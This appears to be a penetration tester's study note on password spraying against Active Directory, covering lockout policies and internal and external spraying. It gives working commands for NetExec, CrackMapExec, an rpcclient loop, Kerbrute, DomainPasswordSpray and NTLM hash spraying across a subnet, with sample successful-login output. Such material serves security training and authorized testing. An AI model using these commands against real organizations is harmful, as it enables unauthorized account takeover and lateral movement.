---
created: 2026-10-08
updated: 2026-10-11
tags:
  - AD_attacks
  - AD
---
## Password spraying

- People often use weak, obvious passwords.
- A single common password such as `Welcome1` or `iloveyou` is likely to match some account in almost any sizable organization.
- One of the most effective ways to gain a foothold on a target network is **password spraying**.

> **Password spraying** is a brute-force technique where an attacker tries **a single common password** (or a small set of common passwords) across a **large number of user accounts**.

- A traditional brute-force attack iterates through thousands of passwords against one account. Often, this quickly triggers account lockouts.
- Password spraying, in contrast, spreads attempts across many users to **evade brute-force detection and account lockouts**.

>[!example]- Password spraying visualization
> 
> | **Round** | **Username**                  | **Password** |
> | --------- | ----------------------------- | ------------ |
> | 1         | `john.doe@example.com`        | `Welcome1`   |
> | 1         | `jane.doe@example.com`        | `Welcome1`   |
> | 1         | `richard.roe@example.com`     | `Welcome1`   |
> | `DELAY`   | *(wait ≥ observation window)* |              |
> | 2         | `john.doe@example.com`        | `Password123`   |
> | 2         | `jane.doe@example.com`        | `Password123`   |
> | 2         | `richard.roe@example.com`     | `Password123`   |
> | `DELAY`   | *(wait ≥ observation window)* |              |
> | 3         | `john.doe@example.com`        | `Winter2022` |
> | 3         | `jane.doe@example.com`        | `Winter2022` |
> | 3         | `richard.roe@example.com`     | `Winter2022` |

>[!tip]+ When password spraying is useful
> - **Externally** — to obtain a foothold on any internet-facing service that authenticates against AD (OWA, VPN, O365, RDS, Citrix, custom web portals).
> - **Internally** — to gain first authenticated access or move laterally.
> - **As a fallback option** — when unauthenticated network enumeration vectors (SMB `null` sessions, LDAP anonymous binds, LLMNR/NBT-NS poisoning) have all come up empty.

- Two things need to be in place before you spray:
	- **A list of valid usernames**
		- Use validated usernames to avoid unnecessary authentication attempts against nonexistent accounts and reduce extraneous authentication events.
		- Usernames can be collected gathered during reconnaissance, such as through OSINT (e.g., LinkedIn, company websites, and metadata in publicly exposed documents), enumerated using `Kerbrute`, or retrieved directly from Domain Controllers (requires valid domain credentials or anonymous access). 
		- See [[Username enumeration in AD]].
	- **Domain password and lockout policies** 
		- Determine the password policy and account lockout thresholds to select appropriate password candidates and assess the risk of account lockout before performing authentication attempts.
		- See [[Password and account lockout policies in AD]].

### Account lockouts

- Although password spraying is designed to avoid tripping security controls, poor timing can still trigger lockouts and cause widespread service disruption.

> [!warning] Performing a password spraying attack without knowing the lockout threshold risks locking out hundreds of production accounts and disrupt business operations.

- The account lockout policy — **lockout threshold**, **lockout duration**, and **observation window** — determines how many failed attempts are safe and how long you must wait between rounds. See [[Password and account lockout policies in AD#Account lockout policy]].

- You can retrieve the lockout policy before spraying in three ways:
	- **Retrieve the account lockout policy directly** from the domain via SAMR, LDAP, or the `SYSVOL` share — see [[Password and account lockout policies in AD#Enumerating the password policy]].
	- **Request the policy from the client** (perfectly legitimate during internal assessments to avoid disruption).
	- **Assume conservative default thresholds** and attempt a slow, targeted attack as a last resort without knowing the policy ("hail mary"). Typically 1-2 passwords per account every 30-60 minutes.

>[!warning] `badPwdCount` is tracked **independently per Domain Controller** and may already be above `0` when you start. If the failure counter is close to the threshold (e.g., `4` against a threshold of `5`), even a single incorrect attempt can tip an account into lockout. See [[Password and account lockout policies in AD#Enumerating the password policy]].

## Internal password spraying

### NetExec/CrackMapExec (from Linux)

- [NetExec](https://github.com/Pennyw0rth/NetExec) over SMB:

```bash
netexec smb 10.10.11.5 -u valid_usernames.txt -p Welcome1 | grep +
```

```bash
netexec smb 10.10.11.5 -u jdoe rroe rwade -p Welcome1 | grep +
```

>[!note]+ Option breakdown
> 
> | Option | Description                                                                    |
> | ------ | ------------------------------------------------------------------------------ |
> | `-u`   | A space-separated list of usernames to try or a file with a list of usernames. |
> | `-p`   | A space-separated list of passwords to try or a file with a list of passwords. |

>[!note] `| grep +` filters output to display only successful authentication attempts.

>[!note] See [`Password Spraying — NetExec Wiki`](https://www.netexec.wiki/smb-protocol/password-spraying).

- CrackMapExec (legacy):

```bash
crackmapexec smb 10.10.11.5 -u valid_usernames.txt -p Welcome1 | grep +
```

>[!example]-
> ```bash
> crackmapexec smb 172.16.5.5 -u valid_usernames.txt -p Password123 | grep +
> ```
> 
> ```bash
> SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
> ```
### `rpcclient` + Bash (from Linux)

- `rpcclient` authenticates to a single account over MS-RPC; wrap it in a Bash loop to iterate over a username wordlist:
 
```bash
for u in $(cat valid_usernames.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

>[!note] A successful login attempt via `rpcclient` outputs `Authority` in the response, so `grep Authority` leaves only valid logins.

> [!note]- Option breakdown
> 
> | Option                  | Description                                                               |
> | ----------------------- | ------------------------------------------------------------------------- |
> | `-U "$u%Welcome1"`      | Authenticate with candidate username `$u` and password `Welcome1`.        |
> | `-c "getusername;quit"` | Execute the RPC command `getusername`, then close the session. |

>[!example]-
> - Unsuccessful login attempt:
> 
> ```bash
> rpcclient -U "jdoe%Welcome1" -c "getusername;quit" 172.16.5.5
> ```
> 
> ```bash
> Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
> ```
> 
> - Successful login attempt:
> 
> ```bash
> rpcclient -U "sgage%Welcome1" 172.16.5.5 -c "getusername;quit"
> ```
> ```bash
> Account Name: sgage, Authority Name: INLANEFREIGHT
> ```
> 

### `Kerbrute`

- [`Kerbrute`](https://github.com/ropnop/kerbrute) password spraying (uses Kerberos pre-authentication):

```bash
kerbrute passwordspray -d example.com --dc 10.10.11.5 valid_usernames.txt Welcome1
```

 >[!note]- Option breakdown
> - `passwordspray` selects password spraying mode.
> 
> |Option|Description|
> |-|-|
> |`-d`|Target realm (FQDN).|
> |`--dc`|IP address of the Domain Controller (DC).|

>[!example]-
> ```bash
> kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_usernames.txt Welcome1
> ```
> 
> ```bash
>     __             __               __     
>    / /_____  _____/ /_  _______  __/ /____ 
>   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
>  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
> /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
> 
> Version: dev (9cfb81e) - 08/01/26 - Ronnie Flathers @ropnop
> 
> 2026/08/01 10:10:12 >  Using KDC(s):
> 2026/08/01 10:10:12 >  	172.16.5.5:88
> 
> 2026/08/01 10:10:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
> ```

>[!note] See [[Kerberos#1. AS exchange (KRB_AS_REQ / KRB_AS_REP)]].

>[!warning] Kerberos password spraying (`passwordspray`) is **not** stealthy like `Kerbrute` username enumeration. Failed pre-authentication attempts return `KRB5KDC_ERR_PREAUTH_FAILED` (Event ID `4771`, `Kerberos pre-authentication failed`), **do** increment `badPwdCount`, and **do** trigger account lockouts. 
>>[!note] See [[Username enumeration in AD#How and why Kerbrute works]].
### Local `Administrator` password & NTLM hash spraying

- Local administrator passwords are often reused — for example, hardcoded credentials baked into golden images deployed across the infrastructure (or plain laziness).
- If you recover a local administrator password or NTLM hash from one host (e.g., dumped from LSASS via Mimikatz or `secretsdump`), spray it across the network to find other hosts that share the same credential.

>[!note] This applies to any credential you discover during an engagement, but local administrator access is usually high-value enough to call out separately.

- When spraying local accounts, specify local authentication to avoid domain account lockout counters:

```bash
netexec smb --local-auth 172.16.5.0/23 -u administrator -H <NTLM_hash> | grep +
```

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <NTLM_hash> | grep +
```

>[!note]- Option breakdown
> 
> | Option | Description |
> | --------------- | --------------------------------------------------------------------------------------------------------------------- |
> | `--local-auth`  | Authenticate only against the target's local SAM database instead of the AD domain, avoiding domain lockout counters. |
> | `172.16.5.0/23` | Specify the target subnet to spray across. |
> | `-u`            | Target the local built-in administrator account. |
> | `-H`            | Supply the NTLM hash for [[Pass-the-Hash]] authentication. |

>[!tip]+
> - **Pattern variations**: local admin passwords often embed the host type — if a workstation uses `Desktop@Admin123`, try `Server@Admin123` against server targets.
> - **Admin naming cross-over**: if you compromise a user account like `jdoe`, test the same password against likely elevated account names such as `jdoe_adm` or `adm_jdoe`.

### Executing password spraying from Windows

- From a domain-joined Windows host, you can use [`DomainPasswordSpray`](https://github.com/dafthack/DomainPasswordSpray) to perform password spraying attacks.
- The tool automatically queries the list of domain user accounts from a DC, and reads the default domain policy and any Fine-Grained Password Policies (FGPPs) in finds. It drops disabled accounts and any accounts within one failed attempt of the lockout threshold, and calculates safe delays between rounds. You only specify the password to try.

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

>[!note]- Option breakdown
> | Option                          | Description                                     |
> | ------------------------------- | ----------------------------------------------- |
> | `-Password`                     | Password to try across user accounts.           |
> | `-OutFile`                      | File where to output valid credential findings. |
> | `-ErrorAction SilentlyContinue` | Suppress errors.                                |
 
>[!example]-
> ```powershell
> PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
> ```
> 
> ```powershell
> PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
> ```
> 
> ```powershell
> [*] Current domain is compatible with Fine-Grained Password Policy.
> [*] Now creating a list of users to spray...
> [*] The smallest lockout threshold discovered in the domain is 5 login attempts.
> [*] Removing disabled users from list.
> [*] There are 2940 total users found.
> [*] Removing users within 1 attempt of locking out from list.
> [*] Created a userlist containing 2940 users gathered from the current user's domain
> [*] The domain password policy observation window is set to  minutes.
> [*] Setting a  minute wait in between sprays.
> 
> Confirm Password Spray
> Are you sure you want to perform a password spray against 2940 accounts?
> [Y] Yes  [N] No  [?] Help (default is "Y"): Y
> [*] Password spraying has begun with  1  passwords
> [*] This might take a while depending on the total number of users
> [*] Now trying password Winter2022 against 2940 users. Current time is 7:38 AM
> [*] Writing successes to spray_success
> [*] SUCCESS! User:dbranch Password:Winter2022
> 89 of 2940 users tested
> # ...
> ```

>[!note]+ `DomainPasswordSpray` reads both the domain password policy and FGPPs, and assumes the **most restrictive** lockout threshold discovered across the domain. See [[Password and account lockout policies in AD#Fine-Grained Password Policies (FGPPs)]].

## On external password spraying

- External password spraying targets internet-facing services that authenticate against Active Directory, aiming to obtain an initial foothold in the organization's network.
- Common external attack targets include:
	- **Microsoft 365/Azure AD** (MS Graph, Azure AD endpoints).
	- **Outlook Web Access (OWA)** & Exchange Web Services (EWS).
	- **Remote Desktop Services (RDS)** & RD Web Portals.
	- **Citrix Gateways** & VMware Horizon VDI infrastructure.
	- **Corporate VPN Gateways** (GlobalProtect, Fortinet, AnyConnect, Pulse Secure).

- Operational considerations:
	- **Lack of policy visibility** — external interfaces rarely expose internal domain password policies or lockout counters.
	- **Multi-Factor Authentication (MFA)** — You may need to bypass MFA (e.g., MFA fatigue or other vectors).
	- **Strict rate limits** — cloud gateways and Web Application Firewalls (WAFs) enforce IP rate limits and threat detection rules.
	- **Conservative timing** — limit external sprays to **1 password attempt per account every 2 to 4 hours**.

## References and further reading

- [`Kerbrute — Active Directory Username Enumeration & Spraying — GitHub`](https://github.com/ropnop/kerbrute)
- [`DomainPasswordSpray — PowerShell Password Spraying Tool — GitHub`](https://github.com/dafthack/DomainPasswordSpray)
- [`Password Spraying — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/password-spraying/)
- [`Password Spraying — NetExec Wiki`](https://www.netexec.wiki/smb-protocol/password-spraying)
